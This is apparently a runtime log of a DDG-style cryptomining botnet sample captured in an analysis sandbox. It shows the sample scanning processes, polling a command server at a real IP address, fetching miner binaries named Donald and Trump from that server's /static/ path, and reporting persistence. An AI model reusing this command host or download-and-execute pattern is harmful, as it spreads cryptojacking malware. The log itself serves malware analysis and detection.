+I0615 12:36:32.318334   17737 cmd_killer.go:49] upstart-file-bridge --daemon --user
+I0615 12:36:32.318458   17737 cmd_killer.go:49] /usr/bin/fcitx
+I0615 12:36:32.318576   17737 cmd_killer.go:49] /usr/bin/dbus-daemon --fork --print-pid 5 --print-address 7 --config-file /usr/share/fcitx/dbus/daemon.conf
+I0615 12:36:32.318695   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/bamf/bamfdaemon
+I0615 12:36:32.318926   17737 cmd_killer.go:49] /usr/bin/fcitx-dbus-watcher unix:abstract=/tmp/dbus-lFSqr653c0,guid=89d5f08134b26815394140b85ce4d4c4 1649
+I0615 12:36:32.319602   17737 cmd_killer.go:49] /usr/lib/at-spi2-core/at-spi-bus-launcher
+I0615 12:36:32.319726   17737 cmd_killer.go:49] /usr/bin/dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-address 3
+I0615 12:36:32.319845   17737 cmd_killer.go:49] /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
+I0615 12:36:32.319965   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd
+I0615 12:36:32.320189   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd-fuse /run/user/0/gvfs -f -o big_writes
+I0615 12:36:32.320308   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/notify-osd
+I0615 12:36:32.320430   17737 cmd_killer.go:49] gpg-agent --homedir /root/.gnupg --use-standard-socket --daemon
+I0615 12:36:32.320785   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/hud/hud-service
+I0615 12:36:32.320905   17737 cmd_killer.go:49] /usr/lib/unity-settings-daemon/unity-settings-daemon
+I0615 12:36:32.321023   17737 cmd_killer.go:49] /usr/lib/gnome-session/gnome-session-binary --session=ubuntu
+I0615 12:36:32.321370   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/unity/unity-panel-service
+I0615 12:36:32.321492   17737 cmd_killer.go:49] /usr/lib/dconf/dconf-service
+I0615 12:36:32.321614   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-messages/indicator-messages-service
+I0615 12:36:32.321970   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-bluetooth/indicator-bluetooth-service
+I0615 12:36:32.323832   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-power/indicator-power-service
+I0615 12:36:32.323909   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-datetime/indicator-datetime-service
+I0615 12:36:32.324421   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-keyboard/indicator-keyboard-service --use-gtk
+I0615 12:36:32.325024   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-sound/indicator-sound-service
+I0615 12:36:32.325095   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-printers/indicator-printers-service
+I0615 12:36:32.325162   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-session/indicator-session-service
+I0615 12:36:32.325228   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-application/indicator-application-service
+I0615 12:36:32.325307   17737 cmd_killer.go:49] /usr/lib/geoclue/geoclue-master
+I0615 12:36:32.325376   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-source-registry
+I0615 12:36:32.325723   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/ubuntu-geoip-provider
+I0615 12:36:32.325796   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-calendar-factory
+I0615 12:36:32.325865   17737 cmd_killer.go:49] /usr/lib/policykit-1-gnome/polkit-gnome-authentication-agent-1
+I0615 12:36:32.326068   17737 cmd_killer.go:49] nm-applet
+I0615 12:36:32.326309   17737 cmd_killer.go:49] /usr/lib/unity-settings-daemon/unity-fallback-mount-helper
+I0615 12:36:32.326987   17737 cmd_killer.go:49] nautilus -n
+I0615 12:36:32.328458   17737 cmd_killer.go:49] /usr/bin/gnome-software --gapplication-service
+I0615 12:36:32.328532   17737 cmd_killer.go:49] compiz
+I0615 12:36:32.328606   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-udisks2-volume-monitor
+I0615 12:36:32.328674   17737 cmd_killer.go:49] /usr/lib/udisks2/udisksd --no-debug
+I0615 12:36:32.328751   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-mtp-volume-monitor
+I0615 12:36:32.328818   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-goa-volume-monitor
+I0615 12:36:32.328884   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-afc-volume-monitor
+I0615 12:36:32.329055   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-gphoto2-volume-monitor
+I0615 12:36:32.329696   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-calendar-factory-subprocess --factory local --bus-name org.gnome.evolution.dataserver.Subprocess.Backend.Calendarx1982x2 --own-path /org/gnome/evolution/dataserver/Subprocess/Backend/Calendar/1982/2
+I0615 12:36:32.333939   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-calendar-factory-subprocess --factory contacts --bus-name org.gnome.evolution.dataserver.Subprocess.Backend.Calendarx1982x3 --own-path /org/gnome/evolution/dataserver/Subprocess/Backend/Calendar/1982/3
+I0615 12:36:32.334027   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-addressbook-factory
+I0615 12:36:32.334099   17737 cmd_killer.go:49] fcitx-qimpanel
+I0615 12:36:32.334173   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-addressbook-factory-subprocess --factory local --bus-name org.gnome.evolution.dataserver.Subprocess.Backend.AddressBookx2168x2 --own-path /org/gnome/evolution/dataserver/Subprocess/Backend/AddressBook/2168/2
+I0615 12:36:32.334263   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd-trash --spawner :1.7 /org/gtk/gvfs/exec_spaw/0
+I0615 12:36:32.334325   17737 cmd_killer.go:49] 
+I0615 12:36:32.334492   17737 cmd_killer.go:49] zeitgeist-datahub
+I0615 12:36:32.334562   17737 cmd_killer.go:49] /bin/sh -c /usr/lib/i386-linux-gnu/zeitgeist/zeitgeist-maybe-vacuum; /usr/bin/zeitgeist-daemon
+I0615 12:36:32.335088   17737 cmd_killer.go:49] /usr/bin/zeitgeist-daemon
+I0615 12:36:32.335919   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/zeitgeist-fts
+I0615 12:36:32.335993   17737 cmd_killer.go:49] /sbin/dhclient -d -q -sf /usr/lib/NetworkManager/nm-dhcp-helper -pf /var/run/dhclient-enp0s3.pid -lf /var/lib/NetworkManager/dhclient-60135289-a78e-332e-8738-3faf9606cf58-enp0s3.lease -cf /var/lib/NetworkManager/dhclient-enp0s3.conf enp0s3
+I0615 12:36:32.336063   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/deja-dup/deja-dup-monitor
+I0615 12:36:32.336134   17737 cmd_killer.go:49] deja-dup --prompt
+I0615 12:36:32.336203   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd-network --spawner :1.7 /org/gtk/gvfs/exec_spaw/1
+I0615 12:36:32.336276   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd-dnssd --spawner :1.7 /org/gtk/gvfs/exec_spaw/3
+I0615 12:36:32.336656   17737 cmd_killer.go:49] bash
+I0615 12:36:32.337153   17737 cmd_killer.go:49] /usr/lib/gnome-terminal/gnome-terminal-server
+I0615 12:36:32.337268   17737 cmd_killer.go:49] bash
+I0615 12:36:32.337381   17737 cmd_killer.go:49] /usr/bin/whoopsie -f
+I0615 12:36:32.337484   17737 cmd_killer.go:49] 
+I0615 12:36:32.338303   17737 cmd_killer.go:49] /usr/sbin/cupsd -l
+I0615 12:36:32.338413   17737 cmd_killer.go:49] 
+I0615 12:36:32.338525   17737 cmd_killer.go:49] /usr/lib/cups/notifier/dbus dbus://
+I0615 12:36:32.338638   17737 cmd_killer.go:49] wireshark-gtk
+I0615 12:36:32.338740   17737 cmd_killer.go:49] 
+I0615 12:36:32.339041   17737 cmd_killer.go:49] 
+I0615 12:36:32.339147   17737 cmd_killer.go:49] 
+I0615 12:36:32.339251   17737 cmd_killer.go:49] 
+I0615 12:36:32.339353   17737 cmd_killer.go:49] 
+I0615 12:36:32.339525   17737 cmd_killer.go:49] 
+I0615 12:36:32.339656   17737 cmd_killer.go:49] 
+I0615 12:36:32.340161   17737 cmd_killer.go:49] 
+I0615 12:36:32.340291   17737 cmd_killer.go:49] /usr/bin/dumpcap -n -i enp0s3 -y EN10MB -Z none
+I0615 12:36:32.340402   17737 cmd_killer.go:49] ./ddgs_4005.i686 -log_dir /tmp/ -alsologtostderr -v 3
+I0615 12:36:32.340505   17737 cmd_killer.go:49] 
+I0615 12:36:32.341300   17737 cmd_killer.go:49] tail -f ddg.log
+I0615 12:36:32.341416   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/unity-scope-home/unity-scope-home
+I0615 12:36:32.341529   17737 cmd_killer.go:49] /usr/bin/unity-scope-loader applications/applications.scope applications/scopes.scope commands.scope
+I0615 12:36:32.341641   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/unity-lens-files/unity-files-daemon
+I0615 12:36:32.341753   17737 cmd_killer.go:49] auditd
+I0615 12:36:32.341991   17737 cmd_killer.go:49] gdb asvfxg 25818
+I0615 12:36:41.693936   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:36:41.694028   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:36:41.930429   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:36:41.930509   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:36:41.976691   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:36:41.978793   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:36:41.982196   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:36:41.983908   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:36:41.985585   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:36:51.693815   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:36:51.693878   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:36:51.693903   17737 report.go:46] empty baselist
+I0615 12:36:51.926309   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:36:51.926952   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:36:51.930036   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:36:51.932990   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:36:51.935709   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:36:51.943048   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:36:51.951430   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:01.695679   17737 report.go:46] empty baselist
+I0615 12:37:01.766925   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:37:01.767446   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:01.777733   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:01.779759   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:01.783907   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:01.785700   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:01.788463   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:11.693903   17737 report.go:46] empty baselist
+I0615 12:37:11.727835   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:37:11.727937   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:11.732739   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:11.734463   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:11.735864   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:11.737384   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:11.739127   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:21.695823   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:37:21.695918   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:37:21.695958   17737 report.go:46] empty baselist
+I0615 12:37:21.929560   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:37:21.931063   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:21.933572   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:21.936004   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:21.937805   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:21.939826   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:21.942898   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:31.698583   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:37:31.698691   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:37:31.698732   17737 report.go:46] empty baselist
+I0615 12:37:31.934623   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:37:31.935634   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:31.938431   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:31.941459   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:31.944180   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:31.951108   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:31.959581   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:41.695542   17737 report.go:46] empty baselist
+I0615 12:37:41.728127   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:37:41.728854   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:41.732147   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:41.734331   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:41.742831   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:41.749080   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:41.752218   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:51.695742   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:37:51.695837   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:37:51.695877   17737 report.go:46] empty baselist
+I0615 12:37:51.930105   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:37:51.931022   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:51.934245   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:51.937174   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:51.939955   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:51.946701   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:37:51.956918   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:01.695598   17737 report.go:46] empty baselist
+I0615 12:38:01.735099   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:38:01.735687   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:01.739640   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:01.741560   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:01.747797   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:01.751447   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:01.755190   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:11.701338   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:38:11.701417   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:38:11.701469   17737 report.go:46] empty baselist
+I0615 12:38:11.848670   17737 miner.go:93] pid not exists {{/tmp/Donald /static/Donald 0f8c0d79ad9f258f8aa56c38968a18f0}}
+I0615 12:38:11.858549   17737 miner.go:93] pid not exists {{/tmp/Trump /static/Trump ed3ddd57d2486b11e52a8ae4c8be8ace}}
+I0615 12:38:11.942862   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:38:11.942934   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:11.944801   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:11.946610   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:11.949718   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:11.951266   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:11.953254   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:15.460278   17737 miner.go:101] fork/exec /tmp/Trump: exec format error: {XRun:{Exe:/tmp/Trump Url:http://67.207.95.103:8000/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}
+I0615 12:38:21.698800   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:38:21.698870   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:38:21.698901   17737 report.go:46] empty baselist
+I0615 12:38:21.929848   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:38:21.929924   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:21.947270   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:21.949419   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:21.951147   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:21.962231   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:21.965004   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:31.695024   17737 report.go:46] empty baselist
+I0615 12:38:31.738786   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:38:31.750243   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:31.754217   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:31.756265   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:31.758476   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:31.761025   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:31.762877   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:41.693193   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:38:41.693276   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:38:41.693303   17737 report.go:46] empty baselist
+I0615 12:38:41.925953   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:38:41.926817   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:41.930338   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:41.933237   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:41.936057   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:41.938885   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:41.941217   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:51.694906   17737 report.go:46] empty baselist
+I0615 12:38:51.742701   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:38:51.743898   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:51.746222   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:51.748002   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:51.749773   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:51.751891   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:38:51.753554   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:01.696021   17737 report.go:46] empty baselist
+I0615 12:39:01.737477   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:39:01.737817   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:01.740866   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:01.742909   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:01.745359   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:01.747203   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:01.749003   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:11.694652   17737 report.go:46] empty baselist
+I0615 12:39:11.710584   17737 utils.go:135] Persistence 1370 Node Successfully
+I0615 12:39:11.735993   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:39:11.736648   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:11.739079   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:11.740959   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:11.747100   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:11.749607   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:11.752151   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:21.694742   17737 report.go:46] empty baselist
+I0615 12:39:21.736097   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:39:21.736494   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:21.739237   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:21.741913   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:21.743727   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:21.745893   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:21.747717   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:31.695396   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:39:31.695483   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:39:31.695521   17737 report.go:46] empty baselist
+I0615 12:39:32.163239   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:39:32.164986   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:32.232604   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:32.235209   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:32.237314   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:32.239000   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:32.240779   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:41.697654   17737 report.go:46] empty baselist
+I0615 12:39:41.768800   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:39:41.768906   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
